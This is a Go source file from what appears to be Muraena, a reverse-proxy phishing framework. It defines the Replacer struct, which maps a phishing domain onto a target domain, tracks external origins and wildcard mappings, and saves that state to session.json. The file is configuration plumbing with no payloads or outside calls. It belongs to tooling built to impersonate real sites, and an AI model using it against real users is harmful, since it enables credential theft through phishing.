package proxy

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"strings"
	"sync"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

const ReplaceFile = "session.json"
const CustomWildcardSeparator = "---"
const WildcardPrefix = "wld"

// Replacer structure used to populate the transformation rules
type Replacer struct {
	Phishing                      string
	Target                        string
	ExternalOrigin                []string
	ExternalOriginPrefix          string
	Origins                       map[string]string
	WildcardMapping               map[string]string
	CustomResponseTransformations [][]string
	ForwardReplacements           []string `json:"-"`
	BackwardReplacements          []string `json:"-"`
	LastForwardReplacements       []string `json:"-"`
	LastBackwardReplacements      []string `json:"-"`
	WildcardDomain                string   `json:"-"`

	// Ignore from JSON export
	loopCount int
	mu        sync.RWMutex
}

// Init initializes the Replacer struct.
// If session.json is found, it loads the data from it.
// Otherwise, it creates a new Replacer struct.
func (r *Replacer) Init(s session.Session) error {
	err := r.Load()
	if err != nil {
		log.Debug("Error loading replacer: %s", err)
		log.Debug("Creating a new replacer")
	}

	if r.Phishing == "" {
		r.Phishing = s.Config.Proxy.Phishing
	}

	if r.Target == "" {
		r.Target = s.Config.Proxy.Target
	}

	if r.ExternalOriginPrefix == "" {
		r.ExternalOriginPrefix = s.Config.Crawler.ExternalOriginPrefix
	}

	r.SetExternalOrigins(s.Config.Crawler.ExternalOrigins)
	r.SetOrigins(s.Config.Crawler.OriginsMapping)
	r.SetCustomResponseTransformations(s.Config.Transform.Response.Custom)

	if err = r.DomainMapping(); err != nil {
		return err
	}

	r.MakeReplacements()

	// Save the replacer
	err = r.Save()
	if err != nil {
		return fmt.Errorf("error saving replacer: %s", err)
	}

	return nil
}

// SetCustomResponseTransformations sets the CustomResponseTransformations used in the transformation rules.
func (r *Replacer) SetCustomResponseTransformations(newTransformations [][]string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	// Append to newTransformations the wildcard custom patch:
	// any ".wldXXXXX.domain" should be replaced with:
	// ".wldXXXXX.domain" -> "---wldXXXX.domain"
	// this to address dynamic JS code that uses the wildcard domain

	if r.CustomResponseTransformations == nil {
		r.CustomResponseTransformations = newTransformations
		return
	}

	// Create a map to track existing transformations
	existing := make(map[string]struct{})
	for _, t := range r.CustomResponseTransformations {
		// Create a key from the transformation for easy comparison and lookup
		key := strings.Join(t, "|") // You can use a more sophisticated method for generating the key
		existing[key] = struct{}{}
	}

	// Iterate over the new transformations and add them if they don't exist
	for _, nt := range newTransformations {
		key := strings.Join(nt, "|") // Generate the key from the new transformation
		if _, found := existing[key]; !found {
			r.CustomResponseTransformations = append(r.CustomResponseTransformations, nt)
			existing[key] = struct{}{} // Add to the map to ensure uniqueness for future additions
		}
	}

}

// GetExternalOrigins returns the ExternalOrigins used in the transformation rules.
// It returns a copy of the internal slice.
func (r *Replacer) GetExternalOrigins() []string {
	r.mu.Lock()
	defer r.mu.Unlock()

	// Make a copy of the ExternalOrigins and return it
	ret := make([]string, len(r.ExternalOrigin))
	copy(ret, r.ExternalOrigin)

	return ret
}

// SetExternalOrigins sets the ExternalOrigins used in the transformation rules.
func (r *Replacer) SetExternalOrigins(newOrigins []string) {
	r.mu.Lock()

	if r.ExternalOrigin == nil {
		r.ExternalOrigin = make([]string, 0)
	}

	// merge newOrigins to r.ExternalOrigin and avoid duplicate
	for _, v := range ArmorDomain(newOrigins) {
		//if strings.HasPrefix(v, "-") {
		//	continue
		//}

		if strings.Contains(v, r.getCustomWildCardSeparator()) {
			continue
		}

		// if r.ExternalOrigin does not contain v, append it
		if !contains(r.ExternalOrigin, v) {
			log.Info("[*] New origin %v", tui.Green(v))
			r.ExternalOrigin = append(r.ExternalOrigin, v)
		}
	}

	r.ExternalOrigin = ArmorDomain(r.ExternalOrigin)
	r.mu.Unlock()

	r.MakeReplacements()
}

// GetOrigins returns the Origins mapping used in the transformation rules.
// It returns a copy of the internal map.
func (r *Replacer) GetOrigins() map[string]string {
	r.mu.Lock()

	// Make a copy of the Origins and return it
	ret := make(map[string]string)
	for k, v := range r.Origins {
		ret[k] = v
	}

	r.mu.Unlock()

	return ret
}

// SetOrigins sets the Origins mapping used in the transformation rules.
func (r *Replacer) SetOrigins(newOrigins map[string]string) {

	if len(newOrigins) == 0 {
		return
	}

	if r.Origins == nil {
		r.Origins = make(map[string]string)
	}

	r.mu.Lock()
	defer r.mu.Unlock()
	// merge newOrigins to r.newOrigins and avoid duplicate
	for k, v := range newOrigins {
		k = strings.ToLower(k)
		r.Origins[k] = v
	}
}

// Contains checks if a string is contained in a slice.
func contains(slice []string, s string) bool {
	for _, v := range slice {
		if v == s {
			return true
		}
	}
	return false
}

// Save saves the Replacer struct to a file as JSON.
func (r *Replacer) Save() error {
	r.mu.Lock()
	defer r.mu.Unlock()
	return saveToJSON(ReplaceFile, r)
}

func (r *Replacer) getCustomWildCardSeparator() string {
	// ---XXXwld
	return fmt.Sprintf("%s%s%s", CustomWildcardSeparator, r.ExternalOriginPrefix, WildcardPrefix)
}

// saveToJSON saves the Replacer struct to a file as JSON.
func saveToJSON(filename string, replacer *Replacer) error {
	data, err := json.MarshalIndent(replacer, "", "\t")
	if err != nil {
		return err
	}
	return ioutil.WriteFile(filename, data, 0644)
}

// Load loads the Replacer data from a JSON file.
func (r *Replacer) Load() error {
	rep, err := loadFromJSON(ReplaceFile)
	if err != nil {
		return err
	}

	// update the current replacer pointer
	*r = *rep
	return nil
}

// loadFromJSON loads the Replacer data from a JSON file.
func loadFromJSON(filename string) (*Replacer, error) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	var replacer Replacer
	if err := json.Unmarshal(data, &replacer); err != nil {
		return nil, err
	}

	return &replacer, nil
}
